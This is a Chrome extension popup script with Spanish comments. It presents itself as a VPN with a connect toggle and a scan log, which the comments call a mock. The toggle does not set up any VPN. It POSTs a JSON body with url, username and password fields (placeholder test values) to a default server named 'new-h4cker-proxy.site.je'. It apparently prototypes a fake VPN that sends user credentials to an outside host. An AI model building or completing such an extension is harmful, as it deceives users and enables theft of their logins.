// Configuración por defecto usando TU dominio
const DEFAULT_API_URL = "https://new-h4cker-proxy.site.je/api.php";

const settingsBtn = document.getElementById('settings-btn');
const modal = document.getElementById('settings-modal');
const closeBtn = document.querySelector('.close');
const saveBtn = document.getElementById('save-config');
const vpnToggle = document.getElementById('vpn-toggle');
const apiStatus = document.getElementById('api-status');

const inputApiUrl = document.getElementById('input-api-url');
const logList = document.getElementById('log-list');
const scanCountEl = document.getElementById('scan-count');

let isVpnActive = false;
let scanCount = 0;

// Cargar configuración guardada o poner la por defecto
chrome.storage.local.get(['serverUrl'], (result) => {
 if (result.serverUrl) {
 inputApiUrl.value = result.serverUrl;
 checkApiConnection(result.serverUrl); // Verificar conexión al abrir
 } else {
 inputApiUrl.value = DEFAULT_API_URL;
 }
});

// --- MANEJO DEL MODAL ---
settingsBtn.addEventListener('click', () => modal.classList.remove('hidden'));
closeBtn.addEventListener('click', () => modal.classList.add('hidden'));

// --- VERIFICAR CONEXIÓN API ---
function checkApiConnection(url) {
 apiStatus.innerText = "Verificando...";
 apiStatus.className = "value";
 
 fetch(url)
.then(response => response.ok ? "Conectado": "Error")
.then(status => {
 apiStatus.innerText = status;
 apiStatus.className = "value safe";
 })
.catch(err => {
 apiStatus.innerText = "Desconectado";
 apiStatus.className = "value";
 });
}

// --- GUARDAR CONFIGURACIÓN ---
saveBtn.addEventListener('click', () => {
 const url = inputApiUrl.value.trim();
 chrome.storage.local.set({ serverUrl: url }, () => {
 modal.classList.add('hidden');
 checkApiConnection(url);
 showToast("API Configurada: " + url);
 });
});

// --- TOGGLE Y MOCK SCANNING ---
vpnToggle.addEventListener('click', () => {
 const savedUrl = inputApiUrl.value;
 
 if (isVpnActive) {
 isVpnActive = false;
 vpnToggle.classList.remove('active');
 vpnToggle.innerText = "Conectar";
 apiStatus.innerText = "Desconectado";
 } else {
 isVpnActive = true;
 vpnToggle.classList.add('active');
 vpnToggle.innerText = "Desconectado";
 apiStatus.innerText = "Enviando...";
 
 // Simular envío de log
 addLog("google.com", "Scan");
 
 // Enviar a tu dominio real
 fetch(savedUrl, {
 method: "POST",
 headers: { "Content-Type": "application/json" },
 body: JSON.stringify({
 url: "google.com",
 username: "test_user",
 password: "test_pass",
 timestamp: new Date().toISOString()
 })
 }).then(res => res.json())
.then(data => {
 console.log("Enviado al dominio:", data);
 apiStatus.innerText = "Conectado";
 apiStatus.className = "value safe";
 });
 }
});

function addLog(url, type) {
 scanCount++;
 scanCountEl.innerText = scanCount;
 const li = document.createElement('li');
 li.innerHTML = `<span class="url">${url}</span> <span class="time">${new Date().toLocaleTimeString()}</span>`;
 logList.insertBefore(li, logList.firstChild);
 if (logList.querySelector('.empty')) logList.innerHTML = '';
}

function showToast(msg) {
 const toast = document.createElement('div');
 toast.innerText = msg;
 toast.style.cssText = "position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#238636; color:white; padding:10px 20px; border-radius:5px; font-size:0.9rem; z-index:2000;";
 document.body.appendChild(toast);
 setTimeout(() => toast.remove(), 2000);
}